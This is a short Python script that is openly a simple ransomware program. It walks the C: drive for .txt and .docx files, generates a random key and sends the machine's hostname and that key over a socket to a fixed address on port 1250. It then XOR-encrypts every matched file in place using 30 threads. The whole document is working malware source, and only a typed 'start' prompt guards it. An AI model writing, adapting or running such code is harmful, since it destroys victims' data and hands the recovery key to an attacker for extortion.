import os
import random
import socket
from datetime import datetime
from threading import Thread
from queue import Queue

# this is our guard who break the tool to autorun
guard = input("Enter command for your guard")
if guard !='start':
    quit()

# file that you want to encrypt
Encrypted_file_ext=('.txt','.docx')

#Grab file from system

file_location = []
for root,dirs,files,in os.walk('c:\\'):
    for file in files:
        file_path,file_ext=os.path.splitext(root+"\\"+file)
        if file_ext in Encrypted_file_ext:
            file_location.append(root+'\\'+file)


#Generate key for Decrypt files

key=''
encryption_level =128//8
char_P=''
for i in range(0x00,0xff):
    char_P +=(chr(i))
for i in range(encryption_level):
    key +=random.choice(char_P)


#Grab system name

Hostname=os.getenv('COMPUTERNAME')

#Connect to the sever to send hostname and key

ip_address='192.168.0.103'
port = 1250
time=datetime.now()
with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as soc:
    soc.connect((ip_address,port))
    soc.send(f'[{time}] - {Hostname}:{key}' .encode('utf-8'))


# Encrypt file
def encrypt(key):
    while Q.not_empty:
        file =Q.get()
        index = 0
        max_index=encryption_level - 1
        try:
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'w') as f:
                for byte in data:
                    xor_byte = byte ^ ord(key[index])
                    f.write(xor_byte.to_bytes(1,'little'))
                    if index >=max_index:
                        index = 0
                    else:
                        index += 1

        except:
            print(f'failed to encrypt {file}')
        Q.task_done()

Q = Queue()
for file in file_location:
    Q.put(file)
for i in range(30):
    thread = Thread(target=encrypt, args=(key,), daemon=True)
    thread.start()


Q.join()
print('Encryption was successful')



